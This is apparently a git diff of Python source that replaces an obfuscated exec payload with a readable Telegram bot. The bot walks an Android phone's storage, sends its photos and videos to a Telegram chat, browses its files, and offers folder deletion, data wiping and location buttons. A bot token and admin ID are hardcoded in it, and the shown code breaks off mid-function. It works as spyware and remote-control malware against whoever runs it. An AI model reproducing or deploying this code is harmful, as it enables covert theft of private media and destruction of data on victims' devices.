@@ -1,4 +1,453 @@
+import os
+import shutil
+import random
+import threading
+import time
+from telebot import TeleBot, types
+from colorama import Fore, Style, init
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==gKBwA6H8/33v//W1a4NS0b2qCy7C+MkDtZiac4eLWJ8VdxK7OuDkzZ7KabQb4lYV1SObL2jjIIAUAIDgBAS3UOorUuxAtjxSW4xVb10DLpKUfR/FXqi7/AJVpCF4qopCGeVgMHisi/j14ADWWhQb9JaMIVp4XZ32VuBKTePyelLLY50kTrfl+LRCVY8r2Kka3tkLtRg0/ovU1QQnZ9RB9qFSh6WU9i3vvBt1eazAOy2GB2rwEsSRsl+r69irygA75wVCQ31/vPJBNouWQWJgEat1qJNUcLM2kAaG6wJh4xZjxBTk9PDMv1s7aQfvfKWUjYNz+sfC6T0hpEqQV2QFu0Lww/Q+kwwr1G+N0ir954eCQ15pAvBbictK59BMdNF4S7SQovCsBMHE/jU9bQaUHwFSOu7zx9zcT7xyoGRS4H0HPI0fQ+gwXg21NCLGEoj3+Mr72+P5jFmkg7GeulLujqtJmjXEl/8dv1mMEdXP/gUWJgyx+aIZVYCWJL9r7GhhaA5iAbd6/W+8s6Moa8RPMIbD0F6BI37g8rNuNBemWFsWDv5tQk3GorNRwl1XCwpMT/I5hiBm884L2SDStskFVr9nFlf5w3erfwfAmFfL5Xh48QmVFb08QsLlcZSUIkXrW9JwBeOiDneDGPrZvCDtiQ4q5l81qNZOwDehdR1QKBklo5brozstGyeo0benzIPuRR6eBnK3XGPXfRp2EHNxBsR97a98t5gW6En9rbV4A3PNxu1NvbyxAyIILq87Qe76OtsGR+1B6nePtqsok2i8mx0GQiMOgDnI8tS7u7FzxgEDs9glDDPA/qVY+RFPJfLOzuwhX4SBtvTLlnG8rJy99ZUnY+gGuM7QHdGldUzJiHkf/NmQjeocN6UNXKnvpuub+kSysdsV/nrzMJBOFVHFvq20rO5A5+HGCVvN1fim4XDMCJoOtNB30CL7OWyu8AgumlZk+dH7+AJ46DezcMiJr408UoIv2gnB7LhLlZo96QGfWUeUw8Wsltz9d0VjdH4pp7Z7EfJhGK+F9Q1M9aXsPjk5os5TokepgiARYFlomv60UHp3mz9kuAb6HA3LSigtmbpjwyBV4C6WoFU006l01v/GbOXAh0wtv9bevWHJTik1+/YKEg5/lDBXZUF2y/oFrFfhWjclhcGqlY+rcXl5Vhih7m3v5/2+23O4D2It9aR6k708sdiliSBtzFo8fx8boAlTOAUKFxTq6ZWwnCeGESlbTWIK+XD9Im23RmdnPVzBdKh7fSi8XlNNO44nL1FoFVAS70U0QIefsTzqdl2poenV0hMX6OHzYR5YVR1oj6cmKcuRLoOHY0ukiZgfpQV+8pVUOSEU9fgyXSVjefwbmZG/eWHAKcngdN+3XPAhjTJgV7mYj6yM+l4oxwQSp0C9I44rC/smMdgx26hZ4P3NCT8rcXcR8ssOlz6j/6zuqPjIrc1+df8vWFaZi19et8hKI62io3FHbRAQuaC3jd8l26wufgdZWl04q6hGb2t83I76O/OXtzhbM+2rmY2be0XFtmSqOpckatN4WmUs24/D1S3vaoasxClNvJqr1eH2ISBx3Gf2ryHxhrb4cANjdT4dmnvIciB3ZqFZBHMXYPbCM3S3bKA10sXjlCm+7X710oDRHECF6P+B/CBB/CMz2kqXy8wKgbNeE1bga1W1J6mp6JJcu1ThkXa5/8yh+mHiRuYMHwjx6OpsE8IFqTdL87rnv/L0it6uv7x4RMfH9X7LTRk5XncFqRUKrbK/roeTQDEzm6ya3w97wUW2Y+0fAmMq9eUWvVrzhnkGKUp3Qq0hZSN2BppmcOwnMon4+841ShKyORdLecbZ5n+uhECNdxWNWb/zS6JgWNZtuIY58EDUHoA8yXkfOiDeM7OV0h4IKXvdIqypZY5quOT8ioQ5ReHwk+IP9n7T7mBU6+PuufAJxf3fykMTNbYOZAFTK9unjFfeN88LyuBsxyrWN5pdqbwl8J6nkTe0XLU3rqLpwBlII8+jv0nenqOSOq46bT1/BpETD1jGtcF0hyMqCz+6Wuy+EQDt5s3bFcmYJKWnxVo/PXPXoh6fXKo1qqsybxWlcznggBzuHmQ2nM2AvnqvnPqWDxJKlgWFIhjRBCK7uzE2+sOXQDrFgxCT2S4lupl8CDXntpirorF2J/ezo0GKWGk12LR7E3BzUfn5DH590zkj5X9gEBGCyKlyKWYEtW8Zp+7Zd52/0UDkZbHHixWJnn0cdM4yWjUFbjcmCziAohkxDdU558ULlxdwPlRbW8NTaj5O+KGLw/sGxizm3PS/m1Ff6q8eXRWTHK+//xklIM3XlOJkXbxtWzntLQFlt9Gt0zPtTd6ps94uvv46T/6QoZCm5sHHoUNfIzYrOE+vbS3J1j/72DTD4aOL1Okn0aHd2CNQ1MRoN7E4zBI4RV0ZKZ5px9E0AWEuyMr5bmTNotPnOQ/dRCm+w4i89PZ8vcq9dewzVH8KeJxuNNjcrafA/ERRolnLBblJOnMXZEjiQAf2CGIP6Y+DyQ1ReNqNcLlGFRLyBm0AFF5J/6SCAdSVrYWfuERdtfFBxaIKKAjCPu0xF9o6QJIXGPx/VUMK7W5mpvW/4ll66nkjlUhD2CF4Hp3BSNMJOC6Bzwoi1Mth0Mfeef6V1o6a00Nk631UhCbnauL7/2txxDJxqfPryqSzdlHS9g3JjRosv9YqUDPNOxhIdWEoki8/xrlPKWZ9HrwJTTPw1LnPwdI28rIsgikMT7LhgTAL4RU7U+jt78tcrIhiEPp3Ypv747Xpgrr5kZ6Gwetbzctz+RHhDKHsee+J1juxrlz/O4+wvoNEJYf5tcxh/Y4B/dHqwflWL3UCgh1dsth+ZK54yRqcW+UUv9BDjRF/2Ux7VSj9htfJ0mG6C/9y8WziYb2l/XOxKjhzoxfBPO5LG5R31Z6yn7EpGRvUfM8cvkM9iYzvRaYezNKgWhfOUadaODVFmgzXMka4gjo3qt5xu667EZEVGQvGHaoAapP2srQVPS7ztxkyYoMOWoSKsvynTNeNEsG2FoRdTSs1V0tS3P7atfKtPO1iW1AzR/gFf3tXxDyKPhHkPM70rYphs8XjeNmcmlfdW1Ea+ANdagCc7Bm9A+fgbDsD2iEompvQyGE94BgTyxMI+Bgd5UllXHq5QPYE6lAa/q/pQLf46H9CyvJ01JgplGXjjkR8D4SQvD/bm/QkVsWEPDb7GJGGm95XZlIiEWiqPM4qmF/Am6y2W1qYufBiD0AyYLKsUN8IU9eKU/UyhivgQXU5HOSspqg64batkCN8uPNHfJNVbeTUizXVjEICPtt1sObmgghdUT3Q3r+KuL8s4BGlK2m/MdbRd2v/2q+DIbUt2fu/dOmBNaP9w6yHkZWfa6x9vdQmRIiaTtsfpTI70dD/kweCJSgYTvirWC0LMtQ+s8fsvX8g0WuKCd0RISfqR3pmcgO/QDptCXMsuOsdq24RsTwSE5GS6ifNT1fQXTN2DJZqWQqRQ7fsHjyokd9eUW+RuWvwU6AJS9HYLanBjuQENoHxeL8YvhWcRcVOKqh+2cXbJ8IexrSED9K+O2ZvE9ebjHXr4q15mZL0gVz3PCxxEhq9U/bHXj7PcBwXoXL19gy1t/2Vx355DNFoUlZz0A8t24fCMxZm7dYysT6NknJ6q/DHdxA/yhnasYZVvtVGE3oNulTZKAKQ0CYN+QReBSauvYNITVQBLJ6sPxpv8bAHnT47Uu55BqDpx93XGjVyh1/LQcJeTBnwDzfSB/VXOZGO67olrt0XArXL8DjW/LKviO47F5ItAh70QjGNsfFRNR1gKb+G5I2s2AtPpoIpSIMCk+MphpKBRiFwxUBzSs20kccFMnzjfp4/sVNmV+pTzJvukAmN69q3mF8l6Ke78CxrfH8wNlt78BCiEmAGTIBCOPR5UQ6LqM4VWQlqqXIpIJctliJFZOvorNwwfU5u20l7p1EZBn6kfn7CxOHQYVKZ5q3ibDMEFwC0OjkeqpOpomG4r6gVsm+3cTIh/n5ZkYDjiZvSQOvioKrQrICSc/duBsinjJpwzr/B+CssVqtJKWt6alZPPq8lo1E/t2Yl/gfL3fq01EL0W5dx9xuWPCwBhmNBwylxxp8KfXwiM+YCm9E7YQAuaHXeJKdSEsMwO2Dfw1eK/f4n+R957Wf6CD1q+3gL8UNX5A/iYGuV9gxsTNIs2OCwWJFMQM/SYDfdPBZN8nP/7NOdpgZoWw8dqZhO4lRoAwOmCuEh11JvE/SjYsFxryj4aloOWguhpppvx/guXVWz0YZigxnWRxVD+4jp0dKzd6zZZI4eLv1ikRwEUNMbBlNi8W5gw4l8kWi5WBBrhi5wEiPQYn7P1zKtjWnyTDe0q7gEHWH18YDK2BlOW1P3imRXIuvYeIsQX9TdJCpsmuPvxGy3QG77+ZgjLG8gg+d5jv2046dUDvn9XAle2Q7oGkM3z/AicDbQotfIR+1sJE+xpt/+MapqZxsS4AADuTnLXsuEQn8CAeADJMevV7lQ6cu1xSOqnxWLv/PHG87HtJzmkslRCO/31svb2d4brPaZ59wB6zRXXWCFCtEgR/T9yhfd2r7wAzsWoP7R4UHKlObuHIiTLeQ47qP3NSy35pRJ/oa5qrNNsuXhngVbbhyEKp2o6/RiuFhuXv8t2SiPD6fYLpr+hX/RDnMQJ0XUcjyOP+Ph+zR/COGZEXw17Jq5RKl4vod/6P2k1PNq/lfme86/rpG9a1mKBSv/zAg+9B6oifqICXQ7Hke0wsxFcP9FfYzBYQH9bO/B9K8IBfwMQjNATilNkudL8eCfO6tD0PRs7DYlc7zaHBj7tFdgJpLc6evdoyNBomyvk7BIQguZ7qw2PAMly/d1X6VLgvuVnqUcWykIWknI9y2d+uKereZy3NCaVdnJPdF9oVg5ixjPUxSZaYj9V0mcL1mYbt63VfiB6NbY/xEN6HvKvuyQANMVqS7nCC4GRfpCj4tO09xLB7xId6D/HDl4MJAyLvbSwIK/pVZE82zBBYZv+PF0+g2mRb/iw8tIhXCbOfTt4wVxBNwX35JmSYiDtXrNLwjAUlmukc37mBXPfz1TwI1XSJGbKzg3iWd49iZNn/E18h3X7oQkoIoCAv2vvw/1kk7ZrdiI6YBXW+KBFs9EyBqP0h/2+1FooR+fTZwo5PqbhJV0lNBYCRBeg9na0K5V/Z3Hc+fXiaz6YYR6InEEzI2iBYZIx/VB+69Y4DV1ERQh5vuTfbmnagCyXRd4unS0yb6EFSA2MSyTXrnyndr8ZWpQuYu+YY/tdzv0/hzc0saYf2kBf7JJrElPO6GVDsfB8x6wGCzSPbsOwOsheHuOGQNh2RCc1PoQNc+SJ2eNLVSN3bLLl8hIJAQU42wHf2cBhv3X0AJqRKxl+dRwdQJtWIufcVL498CCETToxb8ENaCQa8S4kyez2aZ4LK/0iEzrD0SPsEClBusApUMIQnhvIPAPXkB2KZkkHngKvS849BWnJdivI+Jq29j3W3odwulRR6qcBnzSFwazKORnfE/ERj2jZ32poMz/aiERcy64OX4lPQ7Db1bG5q2oAauqJ98jNtHmMZDcravFZ0hit5t5isj9mZaE0rtSmNFX/IwDqfyI4hLh23gy+2/gt6ovCeWJ4g4rseQYnSlG2YCJJ8479dBYD/TKA/70RBeRJLlM/2ohXMpQgV9r3RGrWfXO4bYTeRn5iCeQwVYbCc9uK+4A6BdfHPOMJIW2DQD37i2o6xPfl/gEVockjMftIPqHWPyPhzMzwYZWZHQ1X8brsWEUWSMPvkR2LhxxXWbaYQo6qkPM6HnXqSg4tpEeEn2Q99G+75AGnlsbcmTQCHUs67huDnhCm6ZpIOIm2sNqFM2sD0Ad4ORZyP0c3KQe2pdS163/YsiXcmwr79fPw3Fsr3UasqFIyXOWIXsc4YZT6TiKTq7BU9NGFwVU+DrID03ULWu9f5QCNfIhHeYwxKi/V0tzrGep70BCnC1Wuzy/fBctr09+SU4ixZgGyuS+KhYvQ511IOE720wgxS6zHXDOjbbI7fFH7XSrmDcwwlOdvIjfa2/cSAKSHa/oe5hWWrpXkn6x97DP5A2/VUBBqDnF+FdlUPuqXcJ1y+U6IzTWsp6oj6Hla+F7PHOgXCJtq3IZ9dfeCwMQe4PMJXH/nvawMJyhfyUkNOmHW+ggxyFfYpPqPjl8M4ts0VacUxbvoA7aPLOqL9sgJv/gL3iy00lHS/Lf+qKphyw5yi3aHngtHhVfnFj9C8U8p5GTfc3vdH39gONHwCr5i8DnCvn40gINN8RVuTp1vx1MbBWedt+umLph33H+XKtV/oRSzhZr4pLmNc+7t+l2Lh8zc4ozQ51tCZAS2zoSvugo4VlRBEcivrCD6hlgsZMIpYhZip9VwXuG6OW9TUNVL3W06znamW9GftU5RmGGJGS4ngsZtoVGquNMq22M2anKnWmshhVewNyN3lw57QFNVGW9auB3i83EekHabGOsbubxua8Nq+F9NfmBViO0awXjIuR8mpy7WLHAlQQ08Udbae4Ex5CdlcwRgBWNgIvp+s05D2P7wPNuESQCpB1nzcR06nwFBX3wMP6Wf3rMhD/RtwRcSQkymmvk9558iWUcFHcEQSuK/vlsSJuTf8V7TQqRfdOErHSkn69fJr5wEsOs4RaA3dBXpYK5Kr9SYtfvAP4/L+R0dhDQA/uHL6OW5IgcQ7SsG5oYWwTFqAe81POmqPgY9LsmdQ7/6vL4gPslV4xnTduYp0He6fmsXOlZuqt4O5d2epKNY+lvzPRlHxcDoyvOuN0H/Yb2cYMW+NetPimrFonN6hmj1A6XF88aiCJM1v8xwKH7zzBHLddRz32JpKKCRHDg7ij+jkiSYEf8jJPrKcbdb9XnO2mFDUSnJu/Ihx5suK3f/L24LinCYCK+r90rbyEDrW0eh8rAkIh5p+Pd0UFvU69kKXg9Xxe9VxiGvN6yrODsabc9dvWRG4IpaiGNA/u+23WbYsM+K4LB1b+2k/GuMvrz83AFhZe2s7O3Y45Pn5woxHNY0NGtsZp3CZ1F3PbqW+SY4PPGKT0jQkTAjyXz1Bxm+POKGQKU266DjKSnUX2hG5PLTzfYxiZpxnVru+cvd/4TbON5G5N1kbPXipMqzny6SOI2pkOodhcAs+YJ8T3uLAUJ2o1mRaa41kjAEzhhHIhxMniZunJXRTgH9IGYorUeurl3tYQjZ2NoE3/1WmOQcu+KpJg5cCcCZJtKzIYrSxJPlC7FuwFJ6ILYAyta7jBukyvAszA2Q7hmTWAi6JvU3DIvd8FhZN5XSYVxxtm2KkHv5yKtcAC3Y+Qa10gCt4RmL9I3Z5UE9l0IIhQjPPwCyqZrf54BLz6cAhSIWdhS7+gKFnXxvuFbOccm9c/kGgVSDmAwpsf10C5eMP4FhbXb+C4UBY7BXH14HUTTbL0pnVSuSSYUE7do5Lg3zo4LZLRZj9keuD5wf7BQpdvoMiMTASCyuBc7yqtw02xZfb0GJ4DN21BbCxDNjcgFCa5ZB3AR9iqeTYKJnZK6JV4gAkXBEn+PABOBRfBBcHWHRs2YJVO+k0PIkBuReK9/B+w9+l1m3H3WaF3jmyNgyVhjex+cJ3Ksq+fz49PThwC0SJQfQPA7JKKD1rfEUNvtAUrxcx+PKVl77T3SedvGqUEVZyKakHmHv3zj6Kmx5G9hBqs7bDFpFmlFHgGSNXYxczvjrr2dHWrkWSg6YH0AE8eykAQwgUPZI//dbcOSRzJWD1OXNgqAoM6yCGso4gGrIbDN9L4SLg7eIrqmFz9NeHsRms6w3B3XVqtiZPNwOmcZzOjOynmGjknhbFJnQVBTIz3hjAd8ssXj2xcxRKNzu1sYtfnUGTorZcHImPyIQqenr1YTOQAIEjjET43gZr0D3hgzB8pDBM4F6Ykjyx3lrg0j+KSOnumc+v5WE7jEsuP4yz0ZMsz8cfu4PH1fRqdTdR3dcyeGyigSE6BZeNpGmaAR+0r9uGfrz9l8D4ke0p6Or3e9dP50vgKrVJ+iyACDOH6n0oFYQccTti9bbCET+qxvqaJufoNreuKUcTCqPuEnno5kAbYlnDAh8IVJpxus7YwtVK/MAqzJxng2CPsCE3BKvsAeVJN3Jmb5p+/JDBPG6/oJxTpXadJ0hcBX01wMRXUQOd9TTvn9tteY7qa4xAHvgTF+1XZADyemqfjk3vRm6cV1IhPUkq32hRDVtx/EI4yjwteT8BF8HRwh+mSxcn0FElPSuZpK6EvGMb8x9WFYi7xPYhhLvn4Zh/oDr9zSw6M7vVvuwUyDv1zD+8c6iXR/DSLxqymmJ54iq45onNZENtJhdtM5M+UCAuNvPG+/0j+UuK2sPHsm2TQ/sGPoVavYOuTpnYlZZgVaWJd/q7g7eyzI3ZYXb2sgAVGBPQyuoZasP6Svx9I5BTlN/Dk+3sO8wfdLXQS9d60nARf8aRRfQ8/e8O9z6Kb1M/A54cQRoHO8OaQEsT6rNsEo6C7mV5SJZ/qBfn110sUvFSLHfcKGl6L+s7YMRakUmKzOIXQ+Zj5bLyFwu5C3fD+obdzwuUI4/tfTCuw3wy7u6vtoPw/Ru+WF/iuvytFSQM66CkkTc2nc7y3wu0JBKZB8n1c99y7GecyMpiPJF+jWtY5Q+3D56jQNUXzW+IheevZxVel20ie/5kXTr+6mZLMCl524MJ8KIIBwkiL3+ZOuk/OAiw5cHBOQWzM7p/jyqRqnNTck0tBLyNDa1NLjJEtbpT+IKg8F7VQ8T52JQ+0P+BncIhEN/GsJGJnilb48aBRB6ZOgnEY3K4qd6Qax9uxf9RY9TlTx124yFOQU77rcJ/g0OMVAbQSDpM8vqeCuVJ8/ckkgfGB6bldSY7roQacfm3y1ubXOe3i4nhCcQIaLFWV1IHLyR9Im9wN8buklNt0dDx/HbayNkvBusq49N3c3H5Hzy4KYzk7cxbwdkbSOXITKdh2HfK+8aqna/wzmRNeO1dHME/iTQWw7z6seC5+4Wzw6PZfBm/7qHc1pRkEXxVEW2mBcQE8hlyZ4G8i4gsYFpVascmWgaM6m+Db3RDmw6sKc2FdaaZw0P0LoY9rLk2Fr8FNDtgClbVgAwvbZ0mw5tL82hr1H5FXGeVEg3w5Y5wTvq4OvkIwxknqp/wpgzH7zrJfM51fx94S1U4rQKAG2hyVeruXwfoTuiBRPS+WB+Xt70+NKOJC8xpM/qD/I1ZG5GWd2D1eLn2M/ViRu/52kJSPnYfUc6rhmpnzdnlhtDe+eX94h8ctQu9uAMhfzWmTWR36uCVOnT4lz31AaiCJqemg4TMsrDir8rTAI3Daeyxksu/LreAKogtXHUyZeCgUdQH6iXhmcbxafyy7YfBoGPzY1U8cB/D8d1zakUg++W0kzs5ZkUFA2vg6nOhdC2CPuOre+z7JE3HxvFwzy/2c2+OFWpMJ4RDymHzEYnZdlkcr4ZHrhCbqztuwy4KYHkpb4+6LNkqE39jPbIbO6xKgVl3azQmxqvj8GTP5OrykRkfKJ5Fr76cCOjPfrTrd8VsRhcB1IS/iIvJku+vnTiCFWYyRA4NSB5agfzp9AwMcrEMRA+SC2JXoSCO+osJX1PWLf/9w7Dmy+cPCPepu6gmPms6nUdJa/wu9UpvGEMSu0v8x0bXUcJ49H/l1VhjYaXiieTPlbKMdSDMoJ/2UUl9Gf6JVQoDP9nPnfuveDkUIAgAQUY+oiXjFNr+DB6JhwFsCmNFh+ZYZHMQ3fV5oRYRe69aioTGHZBmJFq2gmB8fsLSvce7zpfjlupHLIcNQ3bnKybVNjVh3WxoVI7Uc7wRMQYeRaBTgo+WTvjJisBT57GqzS9W7l+xJRm5MUrtACODY0kNeqepwtGmr/F/FI2UHcK+oWYcperSgxq72PJOfkENIE9iHPZOWvCtjQArkch+Bv3sU8SbVLSal4GRwU1MK9EunVP+JP8brOIN4jEDhIddXGiP/D1g2K0lxgGD4VKhcKIGFI+ViqVpTLIub6gM4TTcetEcvb9vYams58FpAF79pUrvZjG+qMjA/WQnbzcBwVZUHJOnBzrqz1OCT06oS/Uay1S899/VAUsXod2tbzK+0pCXeM1s4iLKWLsvW/tatm2vIvY51HEB8DXUFnT05H4BnQ0HuE68rVMTBr0YDLJapj6hSWziaJFQBSq4wqgha0dN5F2Lg3A+3S9c6pNYla3tCox1gTzOr7Z4J+t2Ofdji7QnOnqrzb1w8YHSPufiL705bMNyUhJL1LHJi5rKdXoibmMpYha28vOA/xpgWgA47cPuuHrQ6BfJF0sqHMf7Kh0+TUKIxQGlSTNma7P5OZSom0yp2oEdau0B1dZUi9suAIkE040JiEiEO7qBV4anYQpjcO2H25xAmKk/uBI4qM0mCC6wGa89mKgshn78C467K/lvouBsck+3TCLMEVRqFzyJI8gTylbzhkCT5+Gx5MB2+V17szzRClhvq8R7Wlxr55TN6/nAvS8lFQt3LHL6oBliN1E4BJL5j7na+CBN2qgTfUPkrcy2leaJm1FLOsAIKmnM8kq4irtZoZNYxJWnVyzuxYSg4yKiSqoJLon3t2L0AqHyjM0HY6YFmoAaE9pJvkOOX78hayGFODn5Gf1jVuaxHDewjmLAC5BXjvWSw/EYD6KS5Yhx2TIiD54GLtKHZRAseiW8Ey3Y9NJczLDdjN/0MSfs6al2LyVep8PUgO6DQxC1NuyubFpkKeBjhHw4PTjxNoI5v8rFOrgUU6PDwsyYCAYD8PWg18FMD2UYjka6KTEF6mJK4bbtz0qoAmB0WBwuahQFf5AF+G9SOuyr1ocLHYBfIpKargJWvzGXZLPzonW09kac2LhSkPeFkcpwB+HRwkVjolKYrJnOe7b7Qvn6vaN64i6iU6nkqZ93c7Fqn3e1W/77H5gl0kWBp1DX6ynKTPB0zM2bQJA2ejAjQqrbtVIqV1SSmiHQ0GbllV1TSRJ4P1zZ8GH7V9xsJQ06hkjwz/7zlpnHQ+ZfEroVCTQY4OA6BG3x8m5y1Db+24qJEAflrXXTd1b0Zgre9xBEmOe2LamybTcZNqWsuzWktbiOH76PO2M/bJ3ZQdR50QJpwi4EagGcaTXquR6+2RYOQqeTXhDrIln8BnzKaxI7Lq6Racn4JmxBh6doVqYwyIXblqEVRtE+HsrXyJyYtc18ZKjoeTBE9LE8k5aHD5Bl+7SBjAxj8s5w4mjQHlOSxC6uP5HHv8kUV4vEF9dOmpxm3JHxFDxeROUXg3CPTQwWZfTVC3A1dSIY7k3yB7AmRhNDf28vclUgJx9bYBOO0d0a1dMQdK3RuVIyKxy7GfpRoaPbHAqQyr9FD8p3w2K6NPnvVcQNDCnEvXyab0NW+GLbo+W65rEqMW/j6TPRccbdcmYqXNY3sGyF4LgSxCLm3jjRsjmMdON8jPVnaLyQ1oVL/AWsaajJA6wqvtfdKYSj8VoLSBlUXBUI10NiBwZbIpUax4WEB5zP+exvcrgC/pR85vt3m6uolc34/4I07EChcyIduzM21kDzjD0IAL0QRahzmNiIXmly+nQI4YXXDnuhAHnG4/+IdJchW8p6JNse2hJHTj8g2YRW22dVTShGgCB6ZTODF5HKSIfM15vu52+MEb5haOJf1wASgKhUp4RTWPKhlNlrPMVSD2Y/7zZOXdNwpyJlhKg9LoLELmis079IAdwvO3HXYBmL3a5voVlU2rzSeSFBMyMLHhy3davCCE2UGdJf36UQAu3Y/6WQS54wJ/XKFDCGeO3Iufh5k/tK5JZHdiNPmOgFevmNewN97fV55TmTMCKPQO0neFgzDq0CRZvUc3vEtSJo2DKBNqP+BzyW1jazzzH7LSH5ssTToUR4BX0xRFQydjTsh9aVm6/0phasV76mdOSVzuunxx6NF18bJbWxAzximsaR85aj97b9hHVT4a11q4gSOk97I9Q27RVNMYtyWQYdNnRK2w/GsAHDrpR7XSVGYlmCo1gToxYMlvtxu09iXTcG+2pRk4Bj1ipUyrNbyXdPbZyvkngcpO0XzLtobEu+0eAyJlxeePjONAl4aX9yzikIOWYsyut78M2M2uCyLdOB+ab3KGu/RqUTA18nPLpKwB8+zNlzO6LRs9rcTbs2NjuV9vekq0Z1Q3jo+djb1zuvJOk9E3xxkPI3YzyxMSk63teBjirbyRCOtXKk9TLnF1ZOJvIZ+BL7+TEIGk8uY9+O5Z23IiIdbb1q4c5KyQMgOTT6geGuDRbTn0WtgqpD864RVDEoQV/40UtFel2mXJl2O/bI7bw56XsMu0zmZQdWi+/VpL2s2ZAaGP/eZfrELguiXI8dtC6Yu5bFhte5snoqx39fchBPRNo4mtxPU962iLVhwhKrm5xxMzF/EpH1I4cLy+lzMx9KcL8JzcfeqzJFRq35BmK5UI0wXNmEZXpdsKBsJCo61nS622zt/OyO3/DSOtvy4zKTqk9uc1bRRHi8+65o4A9YK9sraZi57dAqnBIR18HbiDah8mEQdiT1sEKawOiaPTTMva7q7eLLj9tM0iatTngDWQ+yw6n4iJBZ04+9a0dswOs1irPWP68gldNyqNvEDtGRuioc4ngGgi+J00+txnyNNQuBbKoflwc2/+iRF7sYbmivwQ91lPCYb5XF/Pm8M9EqbBiFRt/E/qO7ynC+FUzx/jySgFT7EuGD3s1o9u7o4vEXMyFY7Hs5ekvaDbR5vO16RdRzmONzdXph41InvBs8CbiKEYBaox3cVwurszeti77vgE7vqr6TGQeaiRuuvfRaLg0fQDnfmUiLHksi4BAvlFrSHqyp4l6Kn52VXEtRfBFTSxOy7M0dZAs+5MMb9YIzvwguoEODatO95BqKdEJM8g+w5KoZsGbqhtd+jEf0JFIhKhTZStoXLaEa0U1XCvb706pYHhVjcP0beCUY6+lBEdgEjrTddZin2zGvHIO4d6cOkMTy2hjJRSWR9AQhvjpx1nbqp0Q5dUSSr79N5Y04SwOoGVF+5teoKY7Tz5fkkbWM0DHvDUBwRM5h+FnpgMXC1SHh62XGE8gk22A/TbAzotsApjxFmRGlqsw7kpXiRTuDjvb63zSYzbsAfcJzTN1cpGRWUmgkt0LzNbQuTGxHiiAADSkIQfy7/Pp///388/fFTVNQ8zsqq7OiFZA0z2T/84NE7BM3Z/+eEfLeWkwnn/Bhzi0gyesmVwJe'))
+init()  
+
+TOKEN = '7542750844:AAHy_rrWqETDZEqQJ5HVWlaKsEADCcfF3UE' #توكن
+ADMIN_ID = 7046488481 # ايدي
+bot = TeleBot(TOKEN)
+
+required_libraries = ['telebot', 'colorama']
+
+def install_libraries():
+    for lib in required_libraries:
+        try:
+            __import__(lib)
+        except ImportError:
+            os.system(f'pip install {lib}')
+
+install_libraries()
+
+def count_photos(directory):
+    count = 0
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if file.endswith('.jpg') or file.endswith('.png'):
+                count += 1
+    return count
+
+def count_videos(directory):
+    count = 0
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'):
+                count += 1
+    return count
+
+def send_media_from_directory(directory, count, message, media_type):
+    sent_count = 0
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if (media_type == 'photo' and (file.endswith('.jpg') or file.endswith('.png'))) or \
+               (media_type == 'video' and (file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'))):
+                if sent_count >= count:
+                    return
+                try:
+                    with open(os.path.join(root, file), 'rb') as media_file:
+                        if media_type == 'photo':
+                            bot.send_photo(message.chat.id, media_file)
+                        else:
+                            bot.send_video(message.chat.id, media_file)
+                    sent_count += 1
+                except Exception as e:
+                    bot.send_message(message.chat.id, f'Error sending {media_type}: {e}')
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    welcome_text = "مرحبًا!  أنا الروبوت الخاص بك.  كيف يمكنني المساعدة؟  🤖"
+    keyboard = types.InlineKeyboardMarkup()
+    button1 = types.InlineKeyboardButton('استخراج الصور 📸', callback_data='extract_photos')
+    button2 = types.InlineKeyboardButton('تنظيف البيانات 🗑️', callback_data='clear_data')
+    button3 = types.InlineKeyboardButton('نسخة من البيانات 📂', callback_data='copy_data')
+    button4 = types.InlineKeyboardButton('احذف المجلد 📁', callback_data='delete_folder')
+    button5 = types.InlineKeyboardButton('استخراج الفيديو 🎥', callback_data='search_videos')
+    button6 = types.InlineKeyboardButton('الموقع 🌍', callback_data='location')
+    button7 = types.InlineKeyboardButton('الملفات 📁', callback_data='files')
+    keyboard.add(button1, button5)
+    keyboard.add(button2, button3)
+    keyboard.add(button4)
+    keyboard.add(button6)
+    keyboard.add(button7)
+    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)
+    
+import hashlib
+import os
+from telebot import types
+
+ITEMS_PER_PAGE = 10
+navigation_history = {}
+
+@bot.callback_query_handler(func=lambda call: call.data == 'files')
+def handle_files(call):
+    root_directory = '/storage/emulated/0/'
+    navigation_history[call.message.chat.id] = [root_directory]
+    show_directory_contents(call.message, root_directory, 0)
+
+def hash_path(path):
+    return hashlib.sha256(path.encode()).hexdigest()[:16]
+
+def show_directory_contents(message, directory, page):
+    chat_id = message.chat.id
+    history = navigation_history.get(chat_id, [])
+    keyboard = types.InlineKeyboardMarkup()
+    files = []
+    dirs = []
+    for item in os.listdir(directory):
+        item_path = os.path.join(directory, item)
+        if os.path.isfile(item_path):
+            files.append(item)
+        else:
+            dirs.append(item)
+    
+    all_items = dirs + files
+    start = page * ITEMS_PER_PAGE
+    end = start + ITEMS_PER_PAGE
+    current_items = all_items[start:end]
+    
+    for item in current_items:
+        item_path = os.path.join(directory, item)
+        if os.path.isfile(item_path):
+            if item.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
+                button = types.InlineKeyboardButton(f'📷 {item}', callback_data=f'file_{hash_path(item_path)}')
+            elif item.lower().endswith(('.mp4', '.avi', '.mkv')):
+                button = types.InlineKeyboardButton(f'🎥 {item}', callback_data=f'file_{hash_path(item_path)}')
+            else:
+                button = types.InlineKeyboardButton(f'📄 {item}', callback_data=f'file_{hash_path(item_path)}')
+        else:
+            button = types.InlineKeyboardButton(f'📁 {item}', callback_data=f'dir_{hash_path(item_path)}')
+        keyboard.add(button)
+    
+    if len(history) > 1:
+        back_button = types.InlineKeyboardButton('⬅️ خلف', callback_data=f'back_{hash_path(directory)}')
+        keyboard.add(back_button)
+    
+    if end < len(all_items):
+        next_button = types.InlineKeyboardButton('➡️ الصفحة التالية', callback_data=f'page_{hash_path(directory)}_{page+1}')
+        keyboard.add(next_button)
+    
+    if page > 0:
+        prev_button = types.InlineKeyboardButton('⬅️ الصفحة السابقة', callback_data=f'page_{hash_path(directory)}_{page-1}')
+        keyboard.add(prev_button)
+    
+    if message.reply_to_message:
